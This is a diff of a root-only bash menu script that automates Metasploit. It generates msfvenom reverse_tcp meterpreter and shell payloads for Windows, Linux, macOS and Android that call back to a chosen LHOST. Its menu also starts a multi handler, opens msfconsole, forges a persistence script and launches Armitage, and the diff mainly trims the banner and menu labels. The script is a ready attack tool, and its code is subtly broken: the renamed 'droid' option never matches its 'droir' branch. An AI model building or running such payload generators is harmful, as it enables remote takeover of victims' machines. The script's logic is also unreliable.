@@ -2,7 +2,7 @@
 # etc etc etc
 # ..................
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
-resize -s 30 60
+#resize -s 30 60
 clear                                   # Clear the screen.
 SERVICE=service;
 
@@ -16,76 +16,45 @@ fi
 mkdir ~/Desktop/temp 
 clear
 clear
-echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit service started \E[1;33m:::::::::::::::::"
-echo -e "\E[1;33m:::::: \e[97mScripts and payloads saved to ~/Desktop/temp/ \E[1;33m::::::"
-echo -e "\E[1;33m:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-read -p "Press [Enter] key to Continue..."
-clear
-echo -e "\E[1;33m:::::::::::::: \e[97mMetasploit automation script \E[1;33m:::::::::::::::"
-echo -e "\e[97m                      ______
-                   .-        -.
-                  /            \               by rand0m1ze
-     \e[94m* \e[97m                   \e[90m* \e[97m
-                 |,  .-.  .-.  ,|        \e[32m* \e[97m
-                 | )(_ /  \_ )( |
-                 |/     /\     \|    \e[34m* \e[97m
-       (@_       <__    ^^    __>         \e[95m* \e[97m
-  _     ) \_______\__|IIIIII|__/____________\e[31m___________ \e[97m
- (_)\e[31m@8@8\e[97m{}<________\e[31m_____\e[97m_____________\e[31m___________________> \e[97m
-        )_/         \ IIIIII /                    \e[31m::::: \e[97m
-       (@            --------                        \e[31m:: \e[97m
-        "
-tput sgr0                                       # 
-echo -e "\e[31m_________________________[ \e[97mSELECT AN OPTION TO BEGIN \e[31m]"
-echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e "\E[1;33m:::\e[97m[1] \e[90mPayload       \e[97m [Create a payload with msvenom]  \E[1;33m"
+echo -e "SELECT AN OPTION"
+echo -e "1. Create Payload"
 tput sgr0                               # Reset colors to "normal."
-echo -e "\E[1;33m:::\e[97m[2] \e[32mListen    \e[97m [Start a multi handler]   \E[1;33m"
+echo -e "2. Start a multi handler"
 tput sgr0
-echo -e "\E[1;33m:::\e[97m[3] \e[34mExploit       \e[97m [Drop into msfconsole]\E[1;33m"
+echo -e "3. Exploit"
 tput sgr0
-echo -e "\E[1;33m:::\e[97m[4] \e[95mPersistence        \e[97m [Forge a Persistence script] \E[1;33m"
+echo -e "4. Forge a Persistence script"
 tput sgr0
-echo -e "\E[1;33m:::\e[97m[5] \e[31mArmitage       \e[97m [Launch Armitage GUI]  \E[1;33m"
+echo -e "5. Armitage"
 tput sgr0
-echo -e "\E[1;33m:::\e[97m[X] \e[32mHack The Gibson    \e[97m [Hac/< The P1aneT]   \E[1;33m"
+echo -e "6. Kage"
 tput sgr0                               # Reset attributes.
-echo -e "\E[1;33m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
-echo -e "\e[97m~~~~~~~~~~~~~~~~~~~~ \e[31mGreetz to the 2600 \e[97m~~~~~~~~~~~~~~~~~~~~\e[31m"
-tput sgr0
-
-
 read options
-
 case "$options" in
 # Note variable is quoted.
-
   "1" | "1" )
   # Accept upper or lowercase input.
-  echo -e "\E[1;33m::::: \e[97mLets Craft a PAYLOAD\E[1;33m:::::"
-
 PS3='Enter your choice 6=QUIT: '
-options=("Windows" "Linux" "Mac" "Android" "List_All" "Quit")
+options=("win" "nix" "mac" "droid" "listall" "exit")
 select opt in "${options[@]}"
 do
     case $opt in
-        "Windows")
+        "win")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
             echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/Desktop/temp\E[1;33m:::::"
             ;;
-        "Linux")
+        "nix")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
             echo -e "\E[1;33m::::: \e[97mshell.elf saved to ~/Desktop/temp\E[1;33m:::::"
             ;;
-        "Mac")
+        "mac")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
             echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/Desktop/temp\E[1;33m:::::"
             ;;
-        "Android")
+        "droir")
             read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
             msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
             echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/Desktop/temp\E[1;33m:::::"
